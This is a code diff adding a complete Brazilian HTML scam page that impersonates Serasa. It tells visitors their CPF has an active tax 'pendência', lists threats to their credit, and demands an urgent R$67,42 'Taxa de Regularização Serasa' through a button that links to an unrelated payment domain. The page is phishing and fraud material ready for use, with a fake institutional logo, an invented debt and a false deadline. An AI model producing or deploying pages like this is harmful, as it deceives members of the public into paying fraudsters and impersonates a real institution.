@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Regularização Serasa</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+      background: linear-gradient(to right, #e3d7ff, #e8ccff);
+      color: #222;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .container {
+      padding: 20px;
+    }
+
+    .card {
+      background: #fff;
+      color: #333;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 8px 25px rgba(105, 43, 144, 0.2);
+      max-width: 500px;
+      width: 100%;
+      animation: fadeIn 1s ease-out;
+    }
+
+    .logo {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    .logo img {
+      max-width: 180px;
+    }
+
+    .warning {
+      color: #6c2bbd;
+      font-size: 22px;
+      margin-bottom: 20px;
+      text-align: center;
+    }
+
+    .steps {
+      list-style: none;
+      padding: 0;
+      margin: 10px 0 20px 0;
+    }
+
+    .steps li {
+      margin: 8px 0;
+      font-weight: bold;
+    }
+
+    .steps .pending {
+      color: #8e44ad;
+    }
+
+    .info {
+      font-size: 16px;
+      margin-bottom: 10px;
+    }
+
+    .consequences {
+      list-style: none;
+      padding-left: 0;
+      margin-bottom: 20px;
+    }
+
+    .consequences li {
+      margin: 6px 0;
+    }
+
+    .payment-box {
+      background: #f8f3ff;
+      padding: 20px;
+      border-radius: 8px;
+      text-align: center;
+    }
+
+    .payment-box h2 {
+      margin: 10px 0;
+      color: #6c2bbd;
+    }
+
+    .payment-box .amount {
+      font-size: 18px;
+      margin: 10px 0;
+      font-weight: bold;
+    }
+
+    .payment-box button {
+      padding: 12px 24px;
+      background: #6c2bbd;
+      border: none;
+      color: #fff;
+      border-radius: 6px;
+      font-size: 16px;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+
+    .payment-box button:hover {
+      background: #5a219d;
+    }
+
+    @keyframes fadeIn {
+      from {
+        opacity: 0;
+        transform: translateY(-15px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="card animated fadeInDown">
+      <div class="logo">
+        <img src="https://img.odcdn.com.br/wp-content/uploads/2020/08/20200821122507.jpg" alt="Logo Serasa">
+      </div>
+      <h1 class="warning">🔍 Regularização Fiscal em Andamento</h1>
+      <ul class="steps">
+        <li class="active">✔ CPF consultado com sucesso</li>
+        <li class="active">✔ Pendência identificada na Receita</li>
+        <li class="pending">❌ Aguardando regularização</li>
+      </ul>
+      <p class="info">
+        Seu CPF apresenta uma <strong>pendência ativa</strong> e está sujeito às seguintes consequências:
+      </p>
+      <ul class="consequences">
+        <li>🚫 Restrição em bancos e crédito</li>
+        <li>💡 Impossibilidade de financiamentos</li>
+        <li>💰 Juros e multas fiscais</li>
+        <li>📉 Redução drástica do score</li>
+      </ul>
+      <div class="payment-box">
+        <p>
+          Para regularizar, efetue o pagamento da <strong>Taxa de Regularização Serasa</strong> agora mesmo:
+        </p>
+        <h2>R$67,42</h2>
+        <p class="amount">Disponível somente até hoje às 23h59.</p>
+       <button onclick="window.location.href='https://pay.feiraobrasil.shop/5pjw3RnK0rN32lQ'">
+  REGULARIZAR CPF
+</button>
+      </div>
+    </div>
+  </div>
+
+</body>
+</html>
